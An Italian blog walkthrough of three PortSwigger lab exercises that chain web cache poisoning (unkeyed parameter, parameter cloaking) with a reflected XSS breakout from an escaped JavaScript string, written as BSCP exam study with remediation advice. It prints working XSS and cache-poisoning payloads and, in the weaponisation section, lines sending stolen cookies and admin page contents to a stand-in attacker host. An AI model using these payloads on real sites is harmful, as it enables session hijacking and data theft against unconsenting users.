---
layout: post
title: "Tre roll: due modi di avvelenare una cache, uno di escapare un escape"
date: 2026-11-15
categories: [web-security, walkthrough]
tags: [portswigger, bscp, web-cache-poisoning, parameter-cloaking, reflected-xss, javascript-context, param-miner, burp-suite, mystery-lab]
excerpt: "Tre lab a caso in una sessione: due mi hanno consegnato una pagina cachata da avvelenare, il terzo mi ha consegnato il payload — e il momento in cui ha fatto clic è stato capire che i primi due erano la consegna e il terzo la cosa consegnata."
lang: it
page_id: three-rolls-cache-poisoning-escape-the-escape
permalink: /posts/three-rolls-cache-poisoning-escape-the-escape/
---

Il filtro mi aveva messo all'angolo e lo sapevo. Le parentesi angolari tornavano HTML-encoded, quindi `</script>` era morto. I doppi apici, encoded pure loro. I singoli apici? Escapati — ogni `'` che mandavo tornava come `\'`, educatamente spuntato. Ero riflesso dentro una stringa JavaScript senza una via d'uscita ovvia, davanti a una response che aveva una risposta pronta per ogni mossa che conoscevo. L'uscita, quando è arrivata, è stata mandare *più* backslash, non meno — battere il loro escaping dandogli in pasto un backslash mio. Quel salto, tra "sono in trappola" e "ho usato la loro difesa contro di loro", è il terzo dei tre lab di cui parla questo post.

Volevo fare tre roll veloci di lab a caso per mettere via materiale, non scrivere un post. Ma i tre che la ruota mi ha dato si sono allineati su un'idea sola così pulita che non scriverlo era impossibile: **i primi due erano su come consegnare un XSS a qualcuno che non clicca mai il tuo link; il terzo era il payload che gli consegneresti.** Cache poisoning e reflected XSS di solito stanno in capitoli separati. Tirati uno di fila all'altro, sono un unico attacco tagliato a metà.

## Il setup

Tutti e tre sono lab della PortSwigger Web Security Academy, pescati a caso dal primo step dell'esame BSCP — il gruppo "ottieni un foothold come utente". Attrezzi i soliti: Burp, Param Miner per il lavoro sulla cache, lo scanner puntato su un singolo input invece che lasciato libero su un crawl. Niente di esotico. La parte interessante non è mai stata lo strumento, è stata leggere cosa la response stava cercando di dirmi.

## La sessione

### Roll 1 — Il parametro unkeyed, e il cookie che voleva la mia attenzione

Primo roll, home page di un blog. La `GET /` tornava subito con header di cache — `Cache-Control: max-age=35`, `Age: 0`, `X-Cache: miss` — quindi qualcosa davanti all'app stava cachando. Param Miner ha segnalato un web cache poisoning, e l'input che gli piaceva era `utm_content`, riflesso nel canonical link della pagina:

```html
<link rel="canonical" href='//YOUR-LAB-ID.web-security-academy.net/?utm_content=YOUR-INPUT'/>
```

Il payload per il breakout era lineare:

```
utm_content='><script>alert(document.cookie)</script>
```

reso — senza escaping — come:

```html
<link rel="canonical" href='//...net/?utm_content='><script>alert(document.cookie)</script>...'/>
```

Il `'` chiude l'`href`, il `>` chiude il tag `<link>`, e `<script>alert(document.cookie)</script>` è un elemento nuovo che esegue. Da solo, è un reflected XSS qualunque: dovrei mandare alla vittima un link costruito ad arte.

Ed è qui che ho quasi perso tempo. La response impostava *anche* un cookie che rifletteva il mio input:

```http
Set-Cookie: utm_content=%27%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e...; Secure; HttpOnly
```

Per un minuto gli sono andato dietro, convinto che la riflessione vivesse nel cookie. Non è così — guarda l'encoding. Nell'header il mio payload è `%27%3e%3cscript%3e...`, tutto percent-encoded, testo inerte. La riflessione viva è il canonical link, dove torna grezzo. **Il cookie era un'esca**, e la spia era lì nell'encoding: encoded vuol dire morto, grezzo vuol dire pericoloso.

La vera lezione di questo lab non è l'XSS, è *perché l'XSS conta qui*. L'obiettivo del lab è far partire `alert(document.cookie)` in una vittima che **visita regolarmente la home page** — non qualcuno che clicca il mio link. Per un reflected XSS normale è impossibile. Ma `utm_content` è un parametro di tracking, e la cache è configurata per lasciarlo **fuori dalla cache key**. Quindi:

```
GET /?utm_content=PAYLOAD   →   cache key = "/"
GET /                       →   cache key = "/"   ← stessa entry
```

La cache tratta le due richieste come la stessa pagina. Avveleni la entry `/` mandando il payload in `utm_content`, e la copia avvelenata viene servita a chiunque chieda `/` — vittima compresa. La mandi senza cache buster, guardi `X-Cache` passare da `miss` a `hit`, verifichi che una `GET /` pulita torni avvelenata, fatto. Il parametro unkeyed è il meccanismo di consegna; l'XSS è solo il carico.

### Roll 2 — Parameter cloaking, ovvero insegnare a cache e backend a non essere d'accordo

Il secondo roll sembrava la stessa famiglia — Param Miner si è acceso con *Query param blacklist*, *Parameter cloaking* e un *Secret uncached input* — ma il meccanismo è più subdolo, ed è quello su cui vale la pena rallentare. Stavolta non c'è nessun parametro comodamente fuori dalla cache key. Uno te lo devi *fabbricare*.

Il target era un endpoint JSONP che la home page carica:

```
GET /js/geolocate.js?callback=setCountryCookie
```

che riflette il valore di `callback` come nome della funzione che avvolge la response:

```js
setCountryCookie({"country":"..."})
```

Quel `callback` è il sink. Il problema è che non puoi semplicemente mandare `callback=alert(1)`, perché quella versione ha una cache key diversa da quella che la home page della vittima richiede. La response avvelenata deve finire archiviata sotto la chiave *pulita*. Il cloaking ti ci porta sfruttando un disaccordo di parsing:

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

Leggila come la legge la **cache** — spezzando solo sul `&`:

```
param 1:  callback = setCountryCookie
param 2:  utm_content = foo;callback=alert(1)      ← un unico blocco opaco
```

`utm_content` è blacklistato, quindi la cache lo butta via dalla chiave. Resta `callback=setCountryCookie` — **byte per byte la chiave che la home page della vittima richiederà.**

Ora leggila come la legge il **backend** — che tratta anche `;` come separatore di parametri:

```
callback     = setCountryCookie
utm_content  = foo
callback      = alert(1)      ← introdotto di nascosto dietro il punto e virgola
```

Due valori di `callback`, e vince l'ultimo. La response diventa:

```js
alert(1)({"country":"..."})
```

Uno script avvelenato, cachato sotto la chiave pulita che la home page carica sempre. La vittima apre la home, la home tira `/js/geolocate.js?callback=setCountryCookie`, la cache restituisce la copia avvelenata, `alert(1)` parte. Il punto da portarsi via: **la vulnerabilità non è l'XSS, è che cache e backend non sono d'accordo su dove finisce un parametro.** `utm_content` è il cavallo di Troia (blacklistato, quindi invisibile alla chiave); il `;` è il grimaldello che fa rientrare `callback` dal lato backend.

Metti roll 1 e roll 2 fianco a fianco e hai tutta la forma della tecnica:

| Tecnica | Come ottieni l'input unkeyed | Payload |
|---|---|---|
| Parametro di query unkeyed | Un parametro è *già* escluso dalla chiave | `utm_content='><script>…</script>` |
| Parameter cloaking | Nessun parametro utile è escluso; ne *nascondi* uno dentro un param blacklistato via `&` vs `;` | `…&utm_content=foo;callback=alert(1)` |

Stesso header di cache in entrata, due grimaldelli diversi.

### Roll 3 — Escapare l'escape

Il terzo roll mi ha dato una barra di ricerca. Il termine si rifletteva dentro una stringa JavaScript:

```js
var searchTerms = 'YOUR-INPUT';
```

E ogni uscita era inchiodata, come dicevo all'inizio: `<` e `>` HTML-encoded (niente `</script>`), `"` HTML-encoded, `'` escapato in `\'`. Non esci dal tag e non chiudi la stringa. Solo che il filtro escapa l'apice e **si dimentica di escapare il backslash** — ed è tutto il lab.

Il payload che ho usato:

```
test37999\';alert(1)//632
```

`test37999` e `632` sono solo i marker random dello scanner per ritrovare la riflessione; ignorali. Il cuore che funziona è `\';alert(1)//`. Il server vede il mio `'` e diligentemente lo escapa in `\'`, ma lascia stare il mio `\` iniziale, quindi la riga resa è:

```js
var searchTerms = 'test37999\\';alert(1)//632';
```

Ora leggila come la legge il motore JavaScript:

- `'test37999\\'` — il `\\` è un *backslash letterale* (un backslash escapato non escapa niente dopo di sé), quindi l'apice successivo **chiude la stringa**
- `;` — chiude in modo pulito l'istruzione `var`
- `alert(1)` — una nuova istruzione, in codice aperto, esegue
- `//632';` — commentato via, così la coda di spazzatura non rompe il parsing

La mossa è anteporre un `\` mio, così i due backslash collassano in uno letterale (`\\`), e questo trasforma il loro apice di escape da *"parte della stringa"* in *"l'apice che chiude la stringa."* Non ho sconfitto la loro difesa — le ho dato in pasto un input che l'ha fatta lavorare per me.

**Una nota onesta sul `;` contro il trucco del `-`.** Il write-up canonico per questo contesto spesso esce con `\'-alert(1)//`, usando la sottrazione — `'stringa' - alert(1)` — per forzare `alert(1)` dentro un'*espressione* che il motore deve valutare. Funziona, ma è lo strumento più sporco. Io ho usato `;` perché qui il contesto è un'istruzione completa (`var x = '...';`), e un punto e virgola semplicemente la chiude e ne apre una nuova: due istruzioni pulite, nessun gioco di prestigio aritmetico. Tienili a mente entrambi, perché la scelta non è estetica. Quando la tua iniezione cade in un punto dove *non puoi* legalmente mettere un `;` — un argomento di funzione, in mezzo a una concatenazione — è il breakout col `-` (o `+`) a sopravvivere, perché ti tiene dentro una singola espressione. Contesto istruzione: `;`. Contesto espressione: `-`.

Per l'esame, questa è la tabella di identificazione che tengo vicina:

| Contesto di riflessione | Difese in campo | Breakout |
|---|---|---|
| Stringa JS, parentesi angolari *non* encoded | nessuna | `</script><script>alert(1)</script>` |
| Stringa JS, solo `<` `>` encoded | apici liberi | `'-alert(1)-'` |
| Stringa JS, `<` `>` + `"` encoded, `'` escapato **ma non `\`** | questo lab | `\';alert(1)//` |
| Stringa JS, `'` **e** `\` entrambi escapati | entrambi | niente escape-the-escape — cerca un altro sink |

La routine di identificazione dietro la tabella sono tre domande, e sotto pressione di tempo sono tutto il gioco: *Dove cade il mio input?* (stringa JS, attributo HTML, body). *Cosa è filtrato esattamente?* — mandi un probe tipo `'"\<>` e rileggi **come torna ciascun carattere**, encoded o grezzo. *Il backslash è escapato?* Se no, e sei in una stringa JS, `\';payload//` è la tua risposta.

## Da `alert(1)` alla sessione di qualcun altro

Un `alert(1)` dimostra che il sink esegue e nient'altro. All'esame l'obiettivo è la sessione dell'admin, quindi il PoC deve crescere in un payload. La prima decisione è un header solo: il cookie di sessione è `HttpOnly`?

`HttpOnly` significa che JavaScript non può *leggere* il cookie — `document.cookie` non lo conterrà — ma il browser lo *invia* comunque a ogni richiesta. Blocca il furto del cookie via XSS; non blocca il suo *uso* dall'interno del browser della vittima. Quindi il bivio:

**Cookie non `HttpOnly` — rubalo.** Stesso breakout del roll 3, carico diverso. La forma di esfiltrazione a cui andrei, esattamente come la formulano le [note BSCP di botesjuan](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study):

```js
\';document.location=`https://OASTIFY.COM/?c=`+document.cookie;//
```

Nota i **backtick**: doppi e singoli apici sono filtrati in questo contesto, quindi un template literal costruisce l'URL senza nessuno dei due. `OASTIFY.COM` sta per il tuo sottodominio Burp Collaborator (o l'access log del tuo exploit server). Il cookie viaggia nella query string e finisce nel log.

**Cookie `HttpOnly` — non rubarlo, cavalcalo.** Non puoi leggere il cookie, ma il browser lo allega al posto tuo, quindi agisci dall'interno della sessione della vittima:

```js
fetch('/admin', {credentials: 'include'})
  .then(r => r.text())
  .then(t => new Image().src = '//OASTIFY.COM/x?' + encodeURIComponent(t));
```

`fetch('/admin')` è *same-origin*, quindi niente muro CORS, e `credentials:'include'` fa allegare al browser il cookie dell'admin — il server risponde come se avesse chiesto l'admin. Poi `new Image().src` spedisce l'HTML rubato *cross-origin* al tuo server; il caricamento di un'immagine non è soggetto a CORS, e a te serve solo che la richiesta parta, non leggerne la risposta.

Una sottigliezza che ha incasinato il mio modello mentale finché non l'ho detta ad alta voce — **`fetch` e `document.location` non sono lo stesso tipo di cosa:**

| | Cosa fa | Naviga via? | CORS sull'esfil? |
|---|---|---|---|
| `document.location = url` | *porta la vittima* all'URL | sì — la pagina cambia, un colpo solo | no (è una navigazione) |
| `new Image().src = url` | *manda una richiesta*, la pagina resta | no | no (immagine = richiesta semplice) |
| `fetch(url)` | *manda una richiesta*, la pagina resta | no | l'invio parte sempre; la lettura della risposta è bloccata |

`document.location` è a prova di errore per un'esfil one-shot (niente CORS, parte sempre) ma rumoroso — la pagina della vittima cambia visibilmente e il tuo script muore con lei. `fetch` e `Image()` restano silenziosi e lasciano girare il tuo codice per il lavoro a più passi. E quando il cookie è `HttpOnly`, `fetch` con `credentials:'include'` è l'*unico* dei tre capace di leggere una pagina same-origin sotto la sessione della vittima — gli altri ci possono navigare, ma non riportano indietro la risposta.

## Il pattern

Due cose si sono cristallizzate lungo i tre roll.

Primo, **cache poisoning e reflected XSS sono un unico attacco archiviato sotto due titoli di capitolo.** Un reflected XSS che richiede alla vittima di cliccare il tuo link, in parecchi target reali, non è un exploit per niente — l'admin non clicca niente. La cache è ciò che trasforma "posso eseguire script nel *mio* browser" in "posso eseguire script nel *suo*, senza interazione." Roll 1 e 2 sono due strade per la stessa consegna; roll 3 è la cosa consegnata. Servono entrambe le metà, e vengono insegnate separate.

Secondo, **è il contesto a scegliere il breakout, non il sink.** Il roll 3 mi ha messo dentro una stringa JavaScript con l'apice escapato ma il backslash dimenticato, e l'uscita era *aggiungere* un backslash. Un diverso set di difese nello stesso sink `var x = '...'` pretenderebbe un payload completamente diverso — `</script>` se le parentesi fossero grezze, `'-alert(1)-'` se fossero encoded solo le parentesi. Il sink mi diceva *dove* ero; solo il filtraggio esatto mi diceva *come* uscirne.

## Esame e campo

**All'esame**, tutti e tre sono Stage 1 — foothold. Il tempo non va nei payload ingegnosi, va nel *riconoscimento*: una coppia `Cache-Control`/`X-Cache` su un input riflesso dice "il poisoning è sul tavolo", un flag *parameter cloaking* di Param Miner dice "cache e backend parsano diversamente", e un probe di `'"\<>` contro una riflessione in stringa JS ti dice il breakout prima che tu l'abbia scritto. Nota il profilo di interazione, perché all'esame conta: tutti e tre hanno bisogno che la vittima *visiti* una pagina che visita comunque (la home), nessuno che clicchi un link dell'attaccante — ed è proprio questo che rende la cache il punto. E occhio ai rabbit hole che costano minuti veri: l'esca del `Set-Cookie` encoded nel roll 1, avvelenare la cache key sbagliata nel roll 2, e nella weaponizzazione, martellare `document.cookie` contro un cookie `HttpOnly` che nel tuo log non comparirà mai. Controlla il flag *prima*, poi scegli il payload.

**Sul campo**, la classifica è per portata, non per quanto lo scanner ci strilla sopra. I cache poisoning sono i più spaventosi: una singola entry avvelenata colpisce ogni visitatore finché il TTL non scade, nessuna interazione, nessun targeting. Il reflected XSS da solo ha portata minore — gli serve un canale di consegna — ed è esattamente perché concatenarlo alla cache è ciò che lo rende rilevante. L'unico controllo che avrebbe chiuso tutti e tre: non riflettere input controllato dalla richiesta in una response senza escaping adatto al suo contesto, e fai concordare cache key e backend, esattamente, su cosa *sia* una richiesta prima che l'uno o l'altro si fidi di un byte.

## Cosa viene dopo

Ho le due metà — un payload che parte in un contesto stringa-JavaScript, e due modi di servirlo a qualcuno che non clicca mai un link. Il filo aperto è il secondo step BSCP: un `alert(1)` di foothold nel browser della vittima è l'inizio, non la fine. Trasformarlo nella sessione dell'admin, e la sessione dell'admin nel server, è dove lo schizzo `fetch('/admin', {credentials:'include'})` qui sopra viene davvero incassato. Questo è il prossimo roll.

## Takeaway

- Un reflected XSS che la vittima deve cliccare spesso non è un exploit per niente; una entry di cache unkeyed è ciò che lo consegna a chi visita solo la home — tratta cache poisoning e XSS come due metà di un unico attacco.
- Il parameter cloaking funziona perché la cache spezza i parametri sul `&` mentre il backend li spezza anche sul `;` — nascondi il parametro vero dentro uno blacklistato e i due parser si contraddicono a tuo favore.
- Quando un filtro escapa `'` in `\'` ma lascia stare `\`, antepponi un backslash tuo: `\\` collassa in un letterale, il loro apice diventa il terminatore della tua stringa, e `\';payload//` è dentro.
- Usa `;` per uscire in un contesto di istruzione e `-`/`+` in un contesto di espressione — la scelta non è estetica; un `;` dove non puoi legalmente metterlo è un `SyntaxError`.
- `HttpOnly` impedisce a `document.cookie` di leggere il cookie ma non al browser di inviarlo: ruba i cookie non-`HttpOnly` con `Image()`/`location`, e cavalca le sessioni `HttpOnly` con `fetch(..., {credentials:'include'})`.

## Riferimenti utili

- [PortSwigger Web Security Academy: Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger: Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)
- [PortSwigger: Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
- [PortSwigger: Reflected XSS into a JS string, angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-html-encoded-single-quotes-escaped)
- [PortSwigger Web Security Academy: Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [Param Miner su GitHub](https://github.com/PortSwigger/param-miner)
- [botesjuan — Burp Suite Certified Practitioner Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato (la Web Security Academy di PortSwigger). Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
